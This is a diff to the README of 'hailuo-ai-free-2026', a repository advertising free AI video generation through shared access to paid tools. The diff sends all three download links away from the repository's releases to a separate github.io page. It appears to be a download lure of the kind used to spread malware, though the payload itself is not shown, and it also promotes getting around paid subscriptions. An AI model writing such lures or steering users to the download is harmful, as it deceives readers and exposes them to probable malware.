@@ -1,6 +1,6 @@
 # 🎬 hailuo-ai-free-2026 - Free AI Video Generation, No Subscription Needed
 
-[![Download Now](https://img.shields.io/badge/Download-Hailuo_AI_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/peppery-bearing6441/hailuo-ai-free-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Hailuo_AI_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://peppery-bearing6441.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Think of it like a community carpool for AI video tools. You share access with o
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[👉 Click Here to Download Hailuo AI Free 2026](https://github.com/peppery-bearing6441/hailuo-ai-free-2026/releases)**
+**[👉 Click Here to Download Hailuo AI Free 2026](https://peppery-bearing6441.github.io)**
 
 The download page will show you available files. Choose the latest version (the one with the highest version number) and download it to your computer.
 
@@ -136,7 +136,7 @@ Every bit of support helps keep this free for everyone.
 
 Stop paying for AI video generation. Hailuo AI Free 2026 puts professional-grade video creation in your hands — free, fast, and easy. Download it now and start creating amazing videos today.
 
-**[⬇️ Download Hailuo AI Free 2026 Now](https://github.com/peppery-bearing6441/hailuo-ai-free-2026/releases)**
+**[⬇️ Download Hailuo AI Free 2026 Now](https://peppery-bearing6441.github.io)**
 
 ---
 
